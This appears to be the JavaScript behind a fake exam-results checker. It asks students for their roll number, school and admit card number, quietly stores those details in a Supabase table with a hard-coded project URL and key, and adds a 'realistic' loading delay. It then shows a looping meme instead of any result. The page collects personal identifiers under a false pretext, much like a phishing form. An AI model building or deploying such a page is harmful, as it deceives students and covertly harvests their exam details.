import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm'

// 🔑 your keys
const supabase = createClient(
  'https://lfdtxuzewghjyxyrhdua.supabase.com',
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxmZHR4dXpld2doanl4eXJoZHVhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc0NzI0MDksImV4cCI6MjA5MzA0ODQwOX0.DdOqAgfwhcQJka0P-HVYx9QeAp0eOAXBYqvMZj5Ms7I'
)

const form = document.getElementById('resultForm');
const loading = document.getElementById('loading');
const overlay = document.getElementById('memeOverlay');
const audio = document.getElementById('memeAudio');

form.addEventListener('submit', async function (e) {
  e.preventDefault();

  const roll   = document.getElementById('roll').value.trim();
  const school = document.getElementById('school').value.trim();
  const admit  = document.getElementById('admit').value.trim();

  if (!roll || !school || !admit) {
    alert('Please fill all fields as given on your admit card.');
    return;
  }

  // 🔄 show loading
  loading.classList.add('show');

  // 📡 send data to Supabase (optional logging)
  try {
    await supabase.from('results').insert([
      { roll, school, admit }
    ]);
  } catch (err) {
    console.log("Supabase error (ignored):", err);
  }

  // ⏳ delay (realistic effect)
  setTimeout(() => {
    loading.classList.remove('show');
    revealMeme();
  }, 1500);
});

function revealMeme() {
  overlay.classList.add('show');

  try {
    audio.loop = true;
    audio.muted = false;
    audio.volume = 1.0;
    audio.currentTime = 0;
    audio.play();
  } catch (e) {}
}
